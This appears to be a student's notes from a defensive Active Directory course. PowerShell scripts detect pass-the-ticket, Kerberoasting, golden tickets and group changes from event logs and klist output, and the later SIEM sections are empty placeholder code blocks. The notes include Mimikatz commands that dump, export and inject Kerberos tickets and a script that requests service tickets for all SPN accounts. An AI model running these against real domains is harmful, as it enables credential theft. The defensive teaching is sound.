Function Get-TGS {
  Begin {
    $TGS = @()
    $FilterXML = @'
<QueryList>
  <Query Id="0" Path="Security">
    <Select Path="Security">
     *[System[band(Keywords,9007199254740992) and (EventID=4769)]]
   </Select>
  </Query>
</QueryList>
'@
  }
  Process {
    $Logs = Get-WinEvent -FilterXml $FilterXML
    ForEach ($L in $Logs) {
      [xml]$XML = $L.toXml()
      $TimeStamp = $XML.Event.System.TimeCreated.SystemTime
      $TargetUserName = $($XML.Event.EventData.Data[0].'#text' -split '@')[0]
      $IPAddress = $($XML.Event.EventData.Data[6].'#text')
      If ($IPAddress -eq '::1') {
        $IPAddress = $(Test-Connection -ComputerName $env:COMPUTERNAME -Count 1 | Select -ExpandProperty IPv4Address).IPAddressToString
      }
      else {
        $IPAddress = $IPAddress.split('::ffff:')[-1]
      }
      $TGS += [PSCustomObject]@{'TimeStamp' = $TimeStamp; 'TargetUserName' = $TargetUserName; 'IPAddress' = $IPAddress }
    }
  }
  end {
    return $TGS
  }
}

$TGT = Get-TGT
$TGS = Get-TGS

ForEach ($T in $TGS) {
    $Valid = $TGT | Where-Object {$_.TargetUserName -eq $($T.TargetUserName) -and $_.IPAddress -eq $($T.IPAddress)}
    If (!$Valid) {
        $T
    }
}
```

We identified a machine that issued a TGS request without having a valid TGT request.

Use `klist` to identify the instances in which a TGT has been imported into the logon session of another user, i.e. the TGT does not belong to that user account but remains on the same computer.

Keberbos tickets are assigned to a **logon session**, which are identified by an unique **logon ID**.

When we run `klist` without any parameters, only the cached tickets for the current session are displayed.

Get a list of all the sessions on a computer by running:

```bat
klist sessions
```

Log on to SERVER04 as offsec and open an elevated command prompt:

View the cached tickets for a specific session by providing the `LogonId` value

```bat
klist -li 0:0xe0071
```

In a typical attack scenario, an adversary will steal a TGT or TGS from one session and inject it into a different session.

=> The **owner** of the ticket will differ from the owner of the session.

Opening another remote desktop session to SERVER04 as the `rene` user.
Then switch back to the session in the context of `offsec` and use Mimikatz to dump all tickets.

```bat
mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" exit
copy "[0;281651d]-2-0-40e10000-rene@krbtgt-CORP.COM.kirbi" 1.kirbi
mimikatz.exe "kerberos::ptt 1.kirbi" exit
```

```bat
klist sessions
```

The output reveals that our actions have not changed the owner of session `3`. It still belongs to the `offsec` user.

```
Current LogonId is 0:0xdffe6
..
[6] Session 4 0:0x2783dd2 Font Driver Host\UMFD-4 Negotiate:Interactive
[7] Session 3 0:0xe0071 CORP\offsec Negotiate:RemoteInteractive
[8] Session 3 0:0xde6b6 Window Manager\DWM-3 Negotiate:Interactive
[9] Session 3 0:0xde416 Window Manager\DWM-3 Negotiate:Interactive
[10] Session 3 0:0xde032 Font Driver Host\UMFD-3 Negotiate:Interactive
...
```

```bat
klist -li 0:0xe0071
```

```
Current LogonId is 0:0xdffe6

Cached Tickets: (1)

#0>     Client: rene @ CORP.COM
        Server: krbtgt/CORP.COM @ CORP.COM
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 3/29/2022 3:47:16 (local)
        End Time:   3/29/2022 13:47:16 (local)
        Renew Time: 4/5/2022 3:47:16 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

The injected TGT owned by rene is now listed inside the session owned by offsec. This discrepancy will allow us to detect injected tickets without relying on logs.

Run on server04

```pwsh
. .\Get-SessionUsers.ps1
Get-SessionUsers
```

```pwsh
Function Get-SessionUsers {
    Begin {
        $Sessions = @()
        $Klist = klist sessions
    }
    Process {
        $Sessions = $Klist | Where-Object { $_ -like "*Session*$env:USERDOMAIN*" } | ForEach-Object { 
            [PSCustomObject]@{'LogonId' = $(($_ -split ' ')[3]).substring(2); 'User' = $($_ -split ' ')[4]}
        }
    }
    End {
        return $Sessions
    }
}
```

Create a second function that will accept the output from `Get-SessionUsers` and extract the 1st ticket from each session. If the owner of the cached ticket doesn’t match the owner of the session, we'll get an alert.

```pwsh
. .\Invoke-PTTSweep.ps1
Get-SessionUsers | Invoke-PTTSweep
```

```pwsh
Function Invoke-PTTSweep {
    [cmdletbinding()]
    param (
        [parameter(mandatory = $true, ValueFromPipeline = $true)]
        $Session
    )
    Begin {
        $Flagged = @()
        $Klist = klist
        $Current = ((($klist) -split 'Current LogonId is')[2] -split ':')[1]
    }
    Process {
        $LogonId = $($Session.LogonId)
        $Expected = $(($Session.User).Split('\')[1]).Trim()
        Try {
            if ($LogonId -eq $Current) {
                $Actual = $((((klist | sls '^#0') -split 'Client: ')[1] -split '@')[0]).Trim() 
            }
            else {           
                $Actual = $((((klist -li $LogonId  | sls '^#0') -split 'Client: ')[1] -split '@')[0]).Trim()
            }  
        }
        Catch {
            if ($_ -like "*Error calling API*") {
                $_ | Out-null
            }
        }
        if ($Expected -ne $Actual) {
            if (!$Actual -ne "$env:computername$") {
		$Flagged += [PSCustomObject]@{'LogonId' = $LogonId; 'SessionUser' = $Expected; 'TGTUser' = $Actual}
            }
        }     
    }
    End {
        return $Flagged
    }
}
```

## Kerberoasting

SPNs can also be associated with computer accounts, which have randomized 120-character passwords, which in practice means they cannot be cracked.

If an enterprise uses the Microsoft Endpoint Manager (MEM), we would find an SPN for every computer account in the domain mapped to an instance called `CmRcService`. The filter we create will eliminate the unnecessary noise from our result set.

when a TGS service request takes place, event `4769` is generated on the domain controller that facilitated the request.

To view a generated `4769` we can log on to CLIENT03 as offsec and execute

`.\TGS_Request.ps1.`

```pwsh
$Searcher = New-Object System.DirectoryServices.DirectorySearcher
$Searcher.PropertiesToLoad.Add("sAMAccountName") | Out-Null
$Searcher.PropertiesToLoad.Add("servicePrincipalName") | Out-Null
$Searcher.PageSize = 1000
$Searcher.Filter = "(&(objectCategory=person)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=2)(ServicePrincipalName=*))"
$SPN = $Searcher.FindAll() | Select Path, @{l='SPN'; e={$_.Properties.serviceprincipalname}}
foreach($spn in $SPN)
{
    Add-Type -AssemblyName System.IdentityModel
    New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn.SPN
}
```

Kerberos tickets can use RC4 or AES encryption but only RC4 encryption can be cracked reliably. event `4769` displays the ticket encryption type of `0x17` or `0x18` represents 2 variations of RC4 encryption, which is what an attacker would prefer.

Log on to DC01 as offsec and run the audit script from an administrative PowerShell prompt.

`.\Audit-Kerberoasting.ps1`

```pwsh
Function Get-TicketEncryption ($Type) {
    Begin {
        $TypeTable = @{
            '0x17' = 'RC4-HMAC'
            '0x18' = 'RC4-HMAC-EXP'
        }
    }
    Process {
        $Value = $TypeTable[$Type]
        If (!$Value) {
            $Value = $Type
        }
    }
    End {
        return $Value
    }
}

$FilterXML = @'
<QueryList>
  <Query Id="0" Path="Security">
    <Select Path="Security">
     *[System[(EventID=4769)]] 
     and
     *[EventData[Data[@Name='TicketEncryptionType'] and (Data='0x17' or Data='0x18')]]
   </Select>
  </Query>
</QueryList>
'@

$Logs = Get-WinEvent -FilterXml $FilterXML
ForEach ($L in $Logs) {
   [xml]$XML = $L.toXml()
   $TimeStamp = $XML.Event.System.TimeCreated.SystemTime
   $TargetUserName = $XML.Event.EventData.Data[0].'#text'
   $ServiceName = $XML.Event.EventData.Data[2].'#text'
   $TicketEncryptionType = Get-TicketEncryption -Type $($XML.Event.EventData.Data[5].'#text')
   $IPAddress = $XML.Event.EventData.Data[6].'#text'
   [PSCustomObject]@{'TimeStamp' = $TimeStamp; 'TargetUserName' = $TargetUserName; 'ServiceName' = $ServiceName; 'TicketEncryptionType' = $TicketEncryptionType; 'IPAddress' = $IPAddress }
}
```

This works in environments that don't use RC4 encrypted tickets but in most enterprises, some applications or services require RC4, which will lead to false positives.

To avoid false positives, create honey tokens. Honey tokens are service accounts with associated SPNs that no legitimate user would use, but an attacker would attempt to crack.

E.g., Use database and web service SPNs (which are very common) or service accounts with an `admincount` set to 1 (which are very valuable).

When create an SPN honey token, make the password for the associated service account very long and complex. This will make the password difficult to crack, ensuring that the service account can not be used against us.

Wxtract the TGS events that target any of our honey tokens, regardless of the encryption type.

`.\Audit-KerberoastingToken.ps1`

```pwsh
Function Get-TicketEncryption ($Type) {
    Begin {
        $TypeTable = @{
            '0x17' = 'RC4-HMAC'
            '0x18' = 'RC4-HMAC-EXP'
        }
    }
    Process {
        $Value = $TypeTable[$Type]
        If (!$Value) {
            $Value = $Type
        }
    }
    End {
        return $Value
    }
}

$FilterXML = @'
<QueryList>
  <Query Id="0" Path="Security">
    <Select Path="Security">
     *[System[(EventID=4769)]]
     and
     *[EventData[Data[@Name='ServiceName'] and (Data='Honeytoken')]]
   </Select>
  </Query>
</QueryList>
'@

$Logs = Get-WinEvent -FilterXml $FilterXML
ForEach ($L in $Logs) {
   [xml]$XML = $L.toXml()
   $TimeStamp = $XML.Event.System.TimeCreated.SystemTime
   $TargetUserName = $XML.Event.EventData.Data[0].'#text'
   $ServiceName = $XML.Event.EventData.Data[2].'#text'
   $TicketEncryptionType = Get-TicketEncryption -Type ($XML.Event.EventData.Data[5].'#text')
   $IPAddress = $XML.Event.EventData.Data[6].'#text'
   [PSCustomObject]@{'TimeStamp' = $TimeStamp; 'TargetUserName' = $TargetUserName; 'ServiceName' = $ServiceName; 'TicketEncryptionType' = $TicketEncryptionType; 'IPAddress' = $IPAddress }
}
```

# Active Directory Persistence

## Domain Group Memberships

Within Active Directory, 2 different types of groups exist: **distribution groups** and **security groups**, which are also referred to as **security-disabled** and **security-enabled** groups, respectively.

Distribution groups are used for emailing a targeted group of people, whereas security groups are used for provisioning access to resources via a given group.

By default, a distribution group will not provide an attacker an avenue to establishing persistence.

E.g., A dedicated distribution group used for critical notifications, such as security incidents. An attacker with the right level of access could remove individuals from that group to keep them out of the loop.

3 built-in security groups:

- `Domain Admins`: Grants full control of the domain, is a member of the built-in administrators group on all domain controllers in a domain, and are administrators on the domain-joined machines

- `Enterprise Admins`: Grants full control of all domains in a forest and is a member of the built-in administrators group on all domain controllers in a forest

- `Administrators`: Grants full control of all the domain controllers in a domain

Every group in Active Directory is assigned a **scope**. A group scope defines where a group can be assigned within a domain or forest(s).

- `Universal`: Can be assigned in any domain in the same forest or trusting forests

- `Global`: Can be assigned in any domain in the same forest or trusting domains or forests

- `Domain Local`: Can only be assigned in the current domain

| GROUP NAME | SCOPE NAME |
| ---------- | ---------- |
| Domain Admins	| Global |
| Enterprise Admins | Universal |
| Administrators | Domain Local |

Yo detect changes to these groups, use the `Account Management` audit policy as the offsec user on DC01.

```pwsh
auditpol /get /category:"Account Management"
```

By default, Windows has auditing enabled for the `Security Group Management` subcategory, which raises success events when changes happen on security groups in a domain.

3 conditions that will trigger an alert from this audit policy:
1. A security group is created, changed, or deleted
2. A security group has a member added or removed
3. A security group is changed to a distribution group or vice versa


Focus on the conditions where a member is added or removed from a security group. These actions will raise 1 of 6 different events because each group scope has its own set of event IDs for each auditable condition.

| EVENT ID | DESCRIPTION |
| -------- | ----------- |
| 4728 | A member was added to a security-enabled global group |
| 4729 | A member was removed from a security-enabled global group |
| 4732 | A member was added to a security-enabled local group |
| 4733 | A member was removed from a security-enabled local group |
| 4756 | A member was added to a security-enabled universal group |
| 4757 | A member was removed from a security-enabled universal group |


These events will tell us 3 critical pieces of information:

1.	Which user account made the change (Subject)
2.	Which user account was added to the security group (Member)
3.	Which security group the user account was added to (Group)

Computer accounts can also be added to security groups. These can be identified in a group as having a "$" appended to their name.

To monitor for all changes, regardless of the targeted group, run the audit script from an elevated PowerShell prompt

`.\Get-SecurityGroupChanges.ps1`

```pwsh
Function Get-ChangeType ([System.String]$EventId) {
    Begin {
        $ChangeTable = @{
            '4728' = 'A member was added to a security-enabled global group.'
            '4729' = 'A member was removed from a security-enabled global group.'
            '4732' = 'A member was added to a security-enabled local group.'
            '4733' = 'A member was removed from a security-enabled local group.'
            '4756' = 'A member was added to a security-enabled universal group.'
            '4757' = 'A member was removed from a security-enabled universal group.'
        }
    }
    Process {
        $Value = $ChangeTable[$EventId]
        If (!$Value) {
            $Value = $EventId
        }
    }
    End {
        return $Value
    }
}

$FilterXML = @'
<QueryList>
  <Query Id="0" Path="Security">
    <Select Path="Security">*[System[(EventID=4728 or EventID=4729 or EventID=4732 or EventID=4733 or EventID=4756 or EventID=4757)]]
    and
    *[EventData[Data[@Name='TargetUserName'] and (Data='Domain Admins' or Data='Administrators' or Data='Enterprise Admins')]]
    </Select>
  </Query>
</QueryList>
'@

$Logs = Get-WinEvent -FilterXml $FilterXML
ForEach ($L in $Logs) {
   [xml]$XML = $L.toXml()
   $TimeStamp = $XML.Event.System.TimeCreated.SystemTime
   $EventId = $XML.Event.System.EventID
   $MemberName = $XML.Event.EventData.Data[0].'#text'
   $GroupName = $XML.Event.EventData.Data[2].'#text'
   $SubjectUserName = $XML.Event.EventData.Data[6].'#text'
   $ChangeType = Get-ChangeType -EventId $EventId
   [PSCustomObject]@{'TimeStamp' = $TimeStamp; 'MemberName' = $MemberName; 'GroupName' = $GroupName; 'SubjectUserName' = $SubjectUserName; 'ChangeType' = "($EventID) $ChangeType" }
}
```

## Domain User Modifications

An admin account called `dadmin`, which is used for onboarding new employee accounts in Active Directory.

The attacker could take advantage of this access to create their own accounts or even modify existing compromised accounts so they are easier to regain access to later. E.g. Changing account passwords to never expire.

```pwsh
auditpol /get /category:"Account Management"
```

The User `Account Management` audit policy contains 17 different events that could be raised.

Create an audit script that provides a high-level overview of what changes were made by a specific account `dadmin`

```pwsh
Function Get-ChangeType ([System.String]$EventId) {
    Begin {
        $ChangeTable = @{
            '4720' = 'A user account was created.'
            '4722' = 'A user account was enabled.'
            '4723' = 'An attempt was made to change an account''s password.'
            '4724' = 'An attempt was made to reset an account''s password.'
            '4738' = 'A user account was changed.'
            '4740' = 'A user account was locked out.'
            '4765' = 'SID History was added to an account.'
            '4766' = 'An attempt to add SID History to an account failed.'
            '4767' = 'A user account was unlocked.'
            '4780' = 'The ACL was set on accounts which are members of administrators groups.'
            '4781' = 'The name of an account was changed.'
            '4794' = 'An attempt was made to set the Directory Services Restore Mode administrator password.'
            '4798' = 'A user''s local group membership was enumerated.'
            '5376' = 'Credential Manager credentials were backed up.'
            '5377' = 'Credential Manager credentials were restored from a backup.'
            '5379' = 'Credential Manager credentials were read'
        }
    }
    Process {
        $Value = $ChangeTable[$EventId]
        If (!$Value) {
            $Value = $EventId
        }
    }
    End {
        return $Value
    }
}

$FilterXML = @'
<QueryList>
  <Query Id="0" Path="Security">
    <Select Path="Security">*[System[Provider[@Name='Microsoft-Windows-Security-Auditing'] and Task = 13824]]
    and 
    *[EventData[Data[@Name='SubjectUserName'] and (Data='dadmin')]]
    </Select>
  </Query>
</QueryList>
'@

$Logs = Get-WinEvent -FilterXml $FilterXML
ForEach ($L in $Logs) {
   [xml]$XML = $L.toXml()
   $TimeStamp = $XML.Event.System.TimeCreated.SystemTime
   $TargetUserName = $XML.Event.EventData.Data[1].'#text'
   $EventId = $XML.Event.System.EventID
   $SubjectUserName = ($XML.Event.EventData.Data | Where {$_.Name -eq 'SubjectUserName'}) | Select -ExpandProperty '#text'
   $TargetUserName = ($XML.Event.EventData.Data | Where {$_.Name -eq 'TargetUserName'}) | Select -ExpandProperty '#text'
   $ChangeType = Get-ChangeType -EventId $EventId
   [PSCustomObject]@{'TimeStamp' = $TimeStamp; 'SubjectUserName' = $SubjectUserName; 'TargetUserName' = $TargetUserName; 'ChangeType' = "($EventID) $ChangeType" }
}
```

## Golden Tickets

logging into client03 as the domain user offsec.

```pwsh
klist
```

```
Current LogonId is 0:0xa54c6

Cached Tickets: (1)

#0>     Client: dadmin @ corp.com
        Server: krbtgt/corp.com @ corp.com
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
        Start Time: 3/9/2022 12:39:54 (local)
        End Time:   3/6/2032 12:39:54 (local)
        Renew Time: 3/6/2032 12:39:54 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

The end and renewal time have values set to 10 years. This is because Mimikatz includes a set of optional parameters that contain default values when they’re not explicitly used.

In this scenario, the parameters `/endin` and `/renewmax` were not included, which are used to set ticket age and renewal deadline.

Since these parameters were not used, their values were automatically set to ten years.

Kerberos tickets are assigned to logon sessions, which are identified by logon IDs. When we execute klist without any parameters, we only find the cached tickets for the current session.

Get a list of all the sessions on a computer

```pwsh
klist sessions
```

View the cached tickets for a specific session, we’ll need to use the -li parameter and provide the logon ID value.

```pwsh
klist -li 0x3e7
```

3 tasks:
1.	Retrieve all the session logon IDs
2.	Retrieve the cached tickets for all sessions
3.	Analyze the results from each session


```pwsh
. .\Get-LogonIds.ps1
. .\Get-Tickets.ps1
Get-LogonIds | Get-Tickets
```

```pwsh
Function Get-LogonIds {
    Begin {
        $Klist = klist sessions
    }
    Process {
        $Sessions = $Klist | Where-Object { $_ -like '* Session*' } | ForEach-Object { (($_ -split ' ')[3]).substring(2) }
    }
    End {
        return $Sessions
    }
}
```

```pwsh
Function Get-Tickets {
    [cmdletbinding()]
    param (
        [parameter(mandatory = $false, ValueFromPipeline = $true)]
        [System.String]$LogonId
    )
    Begin {
        $CachedTickets = @()
        $Klist = klist
        $Current = ((($klist) -split 'Current LogonId is')[2] -split ':')[1]
    }
    Process {
        try {
            if ($LogonId -eq $Current -or $LogonId -eq '') {
                $Klist = klist
                $LogonId = $Current
            }
            else {           
                $Klist = klist -li $LogonId
            }
            
            $Tickets = 5..$Klist.count | ForEach-Object { $Klist[$_] } | Where-Object { $_ }
            if ($Klist -notcontains 'Cached Tickets: (0)') {
                0..$(($Tickets | Select-String "^#\d>").Count - 1) | ForEach-Object {
                    $Index = $_ * 10
                    $Properties = [ordered]@{
                        'LogonId'        = $LogonId
                        'Ticket'         = $_
                        'Client'         = $($Tickets[0 + $Index] -split ':')[1].Trim()
                        'Server'         = $($Tickets[1 + $Index] -split ':')[1].Trim()
                        'EncryptionType' = $($Tickets[2 + $Index] -split ':')[1].Trim()
                        'TicketFlags'    = $($Tickets[3 + $Index] -split 'Ticket Flags')[1].Trim()
                        'StartTime'      = $($Tickets[4 + $Index] -split 'Start Time:')[1].Trim()
                        'EndTime'        = $($Tickets[5 + $Index] -split 'End Time:')[1].Trim()
                        'RenewTime'      = $($Tickets[6 + $Index] -split 'Renew Time:')[1].Trim()
                        'SessionKeyType' = $($Tickets[7 + $Index] -split ':')[1].Trim()
                        'CacheFlags'     = $($Tickets[8 + $Index] -split ':')[1].Trim()
                        'KdcCalled'      = $($Tickets[9 + $Index] -split ':')[1].Trim()
                    }
                    
                    if ($Properties) {
                        $CachedTickets += New-Object -TypeName PSObject -Property $Properties
                    }
                }
            }
        }
        catch {
            if ($_ -like "*Error calling API*") {
                $_ | Out-null
            }
        }
    }
    End {
        return $CachedTickets
    }
}
```

Retrieve all the cached tickets on the current system, retrieve the ticket time values, and sort the results.

```pwsh
Get-LogonIds | Get-Tickets | Select LogonId,StartTime,EndTime | Sort EndTime
```

Running this command has revealed a cached ticket, associated with logon ID `0xa54c6`, with a suspiciously long end time.

Because the normal maximum ticket age is 10 hours and maximum renewal time is 7 days, we can create another function that will parse all cached tickets and alert if any exceed those standard values.

```pwsh
. .\Invoke-GoldenSweep.ps1
Get-LogonIds | Get-Tickets | Invoke-GoldenSweep
```

```pwsh
Function Invoke-GoldenSweep {
    [cmdletbinding()]
    param (
        [parameter(mandatory = $true, ValueFromPipeline = $true)]
        $Ticket
    )
    Process {
        # Time Beacons
        $StartTime = ($Ticket.StartTime -split ' ')[0]
        $EndTime = ($Ticket.EndTime -split ' ')[0]
        $RenewTime = ($Ticket.RenewTime -split ' ')[0]

        if ((New-TimeSpan -Start $StartTime -End $EndTime).Days -gt 10) {
            $Flagged = $Ticket
        }

        if ($RenewTime -ne 0) {
            if ((New-TimeSpan -Start $StartTime -End $RenewTime).Days -gt 7) {
                $Flagged = $Ticket
            }
        }
        
        # Encryption Beacons
        $EncryptionType = $Ticket.EncryptionType  
        if ($EncryptionType -eq 'RSADSI RC4-HMAC(NT)') {
            $Flagged = $Ticket
        }
    }
    End {
        return $Flagged
    }
}
```

Mimikatz will encrypt tickets using RC4 encryption when the NTLM hash of the krbtgt account is used. In updated infrastructure environments, AES-128/256 encryption is more dominant and will provide a visible difference.

Changing the `krbtgt` password only once would be insufficient because if a signature validation fails, the KDC will attempt to verify a ticket using the second NTLM password hash in the `krbtgt` password history.

# SIEM Part One: Intro to ELK

## Elastic Stack (ELK)

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

## ELK Integrations with OSQuery

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

## Rules and Alerts

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

## Timelines and Cases

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

# SIEM Part Two: Combining the Logs

## Phase One: Web Server Initial Access

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

### Enumeration and Command Injection of web01

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

### Phase One Detection Rules

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

## Phase Two: Lateral Movement to Application Server

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

### Brute Force and Authentication to appsrv01

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

### Phase Two Detection Rules

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

## Phase Three: Persistence and Privilege Escalation on Application Server

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

### Persistence and Privilege Escalation on appsrv01

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

### Phase Three Detection Rules

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

## Phase Four: Perform Actions on Domain Controller

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

### Dump AD Database

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

### Phase Four Detection Rules

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```